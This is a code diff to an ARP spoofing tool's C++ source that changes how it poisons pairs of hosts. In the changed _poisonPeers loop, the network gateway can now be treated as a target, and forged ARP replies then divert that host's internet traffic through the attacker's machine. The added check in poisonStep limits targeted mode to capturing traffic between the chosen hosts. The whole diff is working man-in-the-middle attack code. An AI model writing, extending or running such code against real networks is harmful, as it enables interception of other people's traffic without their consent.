@@ -365,13 +365,22 @@ void ArpSpoofer::_poisonPeers() {
     const uint8_t j = (_peerIdx / _explicitCount) % _explicitCount;
     _peerIdx++;
     if (i == j) continue;
-    if (_explicit[i] == _gwIp || _explicit[j] == _gwIp) continue;
-    const Target* ti = findByIp(_explicit[i]);
-    const Target* tj = findByIp(_explicit[j]);
-    if (!ti || !tj) continue;
+    // If the gateway is one of the targets it is poisoned as a peer too, which
+    // diverts the other targets' internet traffic through us (Tn(G) in the UI).
+    // A pair is skipped only if it is self-paired above.
+    // Resolve each side's MAC: a normal target from the table, or the gateway
+    // from _gwMac (the sweep never adds the gateway as a Target).
+    const bool iGw = _explicit[i] == _gwIp, jGw = _explicit[j] == _gwIp;
+    const Target* ti = iGw ? nullptr : findByIp(_explicit[i]);
+    const Target* tj = jGw ? nullptr : findByIp(_explicit[j]);
+    if ((!ti && !iGw) || (!tj && !jGw)) continue;
+    if ((iGw || jGw) && !_gwKnown) continue;
+    const uint8_t* iMac = iGw ? _gwMac : ti->mac;
+    const uint8_t* jMac = jGw ? _gwMac : tj->mac;
+    const uint32_t iIp  = _explicit[i], jIp = _explicit[j];
     // Tell i that j is at our MAC, and j that i is at our MAC.
-    _sendArp(2, ti->mac, _selfMac, _selfMac, tj->ip, ti->mac, ti->ip);
-    _sendArp(2, tj->mac, _selfMac, _selfMac, ti->ip, tj->mac, tj->ip);
+    _sendArp(2, iMac, _selfMac, _selfMac, jIp, iMac, iIp);
+    _sendArp(2, jMac, _selfMac, _selfMac, iIp, jMac, jIp);
     break;
   }
 }
@@ -400,6 +409,13 @@ void ArpSpoofer::poisonStep() {
     _poisonRound = 0;
     _sendArp(2, kBroadcast, _selfMac, _selfMac, _gwIp, kZeroMac, _gwIp);
   }
+
+  // Targeted mode confines capture to traffic *between* the chosen hosts, so it
+  // does not poison each target against the gateway (that would divert all of
+  // their internet traffic). Exception: if the gateway is itself one of the
+  // targets, it is handled as an ordinary peer by _poisonPeers(), which then
+  // does divert that target's internet traffic — shown as Tn(G) in the UI.
+  if (_explicitCount) return;
 
   if (_count == 0) return;
 
